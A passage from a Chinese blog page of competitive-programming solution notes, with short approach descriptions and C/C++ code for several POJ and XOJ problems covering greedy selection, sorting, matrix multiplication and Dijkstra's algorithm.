class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> k;</div><div class="line"><span class="keyword">int</span> len[<span class="number">20005</span>];</div><div class="line"><span class="keyword">int</span> total;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( n &gt; <span class="number">1</span> )&#123;</div><div class="line">        <span class="keyword">int</span> mii1 = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> mii2 = <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (len[mii1] &gt; len[mii2])</div><div class="line">            swap(mii1,mii2);</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">if</span> (len[i] &lt; len[mii1])&#123;</div><div class="line">                mii2 = mii1;</div><div class="line">                mii1 = i;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len[i] &lt; len[mii2])&#123;</div><div class="line">                mii2 = i;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> t = len[mii1] + len[mii2];</div><div class="line">        ans += t;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (mii1 == n<span class="number">-1</span>)</div><div class="line">            swap(mii1,mii2);</div><div class="line">        len[mii1] = t;</div><div class="line">        len[mii2] = len[n<span class="number">-1</span>];</div><div class="line">        n--;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    total = <span class="number">0</span>;</div><div class="line">    k = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;len[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    solve();</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3617"><a href="#3617" class="headerlink" title="3617"></a>3617</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3617" target="_blank" rel="external">http://poj.org/problem?id=3617</a></p>
<h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>贪心算法，每次选择排序靠前的字母加到字符串t中。如果两个排序相同，则看它们的下一个字母的顺序，可以使用一个递归函数来判断。</p>
<h3 id="提交-9"><a href="#提交-9" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">char</span> s[<span class="number">2005</span>];</div><div class="line"><span class="keyword">char</span> t[<span class="number">2005</span>];</div><div class="line"><span class="keyword">int</span> sp,ep;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (s[i] &gt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] &lt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == s[j])&#123;</div><div class="line">        i++;</div><div class="line">        j--;</div><div class="line">        <span class="keyword">return</span> compare(i,j);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">" %c"</span>,&amp;s[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    sp = <span class="number">0</span>;</div><div class="line">    ep = n<span class="number">-1</span>;</div><div class="line">    <span class="keyword">int</span> lenoft = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (lenoft != n)&#123;</div><div class="line">        <span class="keyword">int</span> p = compare(sp,ep);</div><div class="line">        <span class="keyword">if</span> (p == <span class="number">0</span>)&#123;</div><div class="line">            t[lenoft] = s[sp];</div><div class="line">            sp++;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p == <span class="number">1</span>)&#123;</div><div class="line">            t[lenoft] = s[ep];</div><div class="line">            ep--;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,t[i<span class="number">-1</span>]);</div><div class="line">        <span class="keyword">if</span> (i % <span class="number">80</span> == <span class="number">0</span>)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="XOJ"><a href="#XOJ" class="headerlink" title="XOJ"></a>XOJ</h1><h2 id="1004"><a href="#1004" class="headerlink" title="1004"></a>1004</h2><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>冒泡等可能会超时。堆排序和快排的复杂度都是 O(nlogn)。课上为了节约时间所以：）</p>
<h3 id="提交-10"><a href="#提交-10" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> arrays[<span class="number">1000004</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arrays[i]);</div><div class="line">    sort(arrays,arrays+n);</div><div class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n - <span class="number">1</span>;j++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,arrays[j]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arrays[n - <span class="number">1</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>oj对格式要求好严格…</p>
<h2 id="1005"><a href="#1005" class="headerlink" title="1005"></a>1005</h2><p>此题另写一篇文章了。</p>
<h2 id="1022"><a href="#1022" class="headerlink" title="1022"></a>1022</h2><h3 id="想法-1"><a href="#想法-1" class="headerlink" title="想法"></a>想法</h3><p>直接用普通的矩阵乘法就过了，<br>时间复杂度 O(<script type="math/tex">n^3</script>)</p>
<h3 id="提交-11"><a href="#提交-11" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> n1,m1;</div><div class="line">    <span class="keyword">int</span> n2,m2;</div><div class="line">    <span class="keyword">int</span> matrix1[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">int</span> matrix2[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n1,&amp;m1);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m1;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix1[i][j]);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n2,&amp;m2);</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n2;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix2[i][j]);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> matrix3[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            matrix3[i][j]=<span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i1,j2;</div><div class="line">    <span class="keyword">for</span>(i1 = <span class="number">0</span>;i1 &lt; n1;i1++)</div><div class="line">        <span class="keyword">for</span>(j2 = <span class="number">0</span>;j2 &lt; m2;j2++)</div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n2;j++)</div><div class="line">              matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2];</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2 - <span class="number">1</span>;j++)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,matrix3[i][j]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,matrix3[i][m2<span class="number">-1</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1061"><a href="#1061" class="headerlink" title="1061"></a>1061</h2><h3 id="想法-2"><a href="#想法-2" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。其实就是任务选择问题。</p>
<ul>
<li>按照约会完成时间从早到晚排序</li>
<li>选择具有最早完成时间的girl</li>
<li>将此girl加入到约会列表中</li>
<li>对子问题重复上述问题</li>
<li>强烈谴责Ckp</li>
</ul>
<h3 id="提交-12"><a href="#提交-12" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> info&#123;</div><div class="line">    <span class="keyword">char</span>  name[<span class="number">16</span>];</div><div class="line">    <span class="keyword">char</span>  starttime[<span class="number">6</span>];</div><div class="line">    <span class="keyword">char</span>  endtime[<span class="number">6</span>];</div><div class="line">&#125;info;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info * s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">static</span> info mm[<span class="number">1005</span>] ;</div><div class="line">    <span class="keyword">static</span> info mmcopy[<span class="number">1005</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s%s%s"</span>,mm[i].name,mm[i].starttime,mm[i].endtime);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(mm,<span class="number">1</span>,n,n);</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].endtime,mm[<span class="number">1</span>].endtime);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].name,mm[<span class="number">1</span>].name);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].starttime,mm[<span class="number">1</span>].starttime);</div><div class="line">    <span class="keyword">int</span> cal = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(mmcopy[cal].endtime,mm[i].starttime) &lt;= <span class="number">0</span>)&#123;</div><div class="line">            cal++;</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].endtime,mm[i].endtime);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].name,mm[i].name);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].starttime,mm[i].starttime);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,cal);</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; cal; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>,mmcopy[i].name);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,mmcopy[i].name);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info* s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)&#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        info x;</div><div class="line">        <span class="built_in">strcpy</span>(x.endtime,s[l].endtime);</div><div class="line">        <span class="built_in">strcpy</span>(x.name,s[l].name);</div><div class="line">        <span class="built_in">strcpy</span>(x.starttime,s[l].starttime);</div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[j].endtime,x.endtime) &gt;= <span class="number">0</span>)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                <span class="built_in">strcpy</span>(s[i].endtime,s[j].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].starttime,s[j].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].name , s[j].name);</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[i].endtime,x.endtime) &lt; <span class="number">0</span>)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line"></div><div class="line">                <span class="built_in">strcpy</span>(s[j].endtime,s[i].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].starttime,s[i].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].name,s[i].name);</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(s[i].endtime,x.endtime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].starttime,x.starttime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].name,x.name);</div><div class="line"></div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>,n);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r,n);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1062"><a href="#1062" class="headerlink" title="1062"></a>1062</h2><h3 id="想法-3"><a href="#想法-3" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。尽量选择面值大的。<br>将元转换为角，这样都是整数，进行处理更方便。</p>
<h3 id="提交-13"><a href="#提交-13" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> zhibi&#123;</div><div class="line">    <span class="keyword">int</span> number;</div><div class="line">    <span class="keyword">int</span> value;</div><div class="line">&#125;zhibi;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    zhibi arr[<span class="number">7</span>];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i].number);</div><div class="line">    &#125;</div><div class="line">    arr[<span class="number">1</span>].value = <span class="number">500</span>;</div><div class="line">    arr[<span class="number">2</span>].value = <span class="number">100</span>;</div><div class="line">    arr[<span class="number">3</span>].value = <span class="number">50</span>;</div><div class="line">    arr[<span class="number">4</span>].value = <span class="number">10</span>;</div><div class="line">    arr[<span class="number">5</span>].value = <span class="number">5</span>;</div><div class="line">    arr[<span class="number">6</span>].value = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> remainMoney;</div><div class="line">    remainMoney = <span class="number">1000</span> - n * <span class="number">25</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">int</span> j = remainMoney / arr[i].value;</div><div class="line">            <span class="keyword">int</span> number = j&gt;arr[i].number?arr[i].number:j;</div><div class="line">            remainMoney = remainMoney - number*arr[i].value;</div><div class="line">            stat = stat + number;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,stat);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1075"><a href="#1075" class="headerlink" title="1075"></a>1075</h2><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><p>直接dijkstra。 采用邻接矩阵存储。</p>
<h3 id="提交-14"><a href="#提交-14" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span 